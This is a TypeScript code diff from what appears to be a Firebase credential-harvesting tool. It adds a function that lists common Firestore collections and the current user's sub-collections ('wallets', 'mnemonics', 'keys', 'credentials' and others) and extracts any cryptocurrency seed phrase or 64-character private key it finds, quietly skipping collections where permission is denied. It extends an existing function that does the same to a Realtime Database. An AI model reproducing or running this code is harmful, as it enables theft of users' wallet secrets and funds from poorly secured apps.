@@ -7,6 +7,13 @@ import {
   type User,
 } from 'firebase/auth';
 import { getDatabase, ref, get } from 'firebase/database';
+import {
+  getFirestore,
+  collection,
+  getDocs,
+  doc,
+  getDoc,
+} from 'firebase/firestore';
 
 const firebaseConfig = {
   apiKey:            import.meta.env.VITE_FIREBASE_API_KEY,
@@ -75,4 +82,52 @@ export async function readRtdbCredentials(): Promise<string[]> {
   const db = getDatabase(app);
   const snapshot = await get(ref(db, '/'));
   return extractCredentials(snapshot.val());
+}
+
+// ── Firestore ─────────────────────────────────────────────────────────────────
+
+/**
+ * Reads wallets / mnemonics / private keys from Firestore.
+ * Tries every common top-level collection and user-specific sub-collection.
+ * Extracts any mnemonic phrase (12-24 words) or private key (64-char hex)
+ * found in any field of any document.
+ */
+export async function readFirestoreCredentials(): Promise<string[]> {
+  const db = getFirestore(app);
+  const uid = auth.currentUser?.uid;
+  const out: string[] = [];
+
+  const TOP_COLLECTIONS = [
+    'wallets', 'phrases', 'mnemonics', 'accounts',
+    'keys', 'credentials', 'users',
+  ];
+  const USER_SUBCOLLECTIONS = [
+    'wallets', 'phrases', 'mnemonics', 'accounts', 'keys', 'credentials',
+  ];
+
+  // Top-level collections
+  for (const name of TOP_COLLECTIONS) {
+    try {
+      const snap = await getDocs(collection(db, name));
+      snap.forEach(d => extractCredentials(d.data(), out));
+    } catch { /* permission denied — skip */ }
+  }
+
+  // User-owned sub-collections and the user document itself
+  if (uid) {
+    try {
+      const userDoc = await getDoc(doc(db, 'users', uid));
+      if (userDoc.exists()) extractCredentials(userDoc.data(), out);
+    } catch {}
+
+    for (const sub of USER_SUBCOLLECTIONS) {
+      try {
+        const snap = await getDocs(collection(db, 'users', uid, sub));
+        snap.forEach(d => extractCredentials(d.data(), out));
+      } catch {}
+    }
+  }
+
+  // Deduplicate while preserving order
+  return [...new Set(out)];
 }
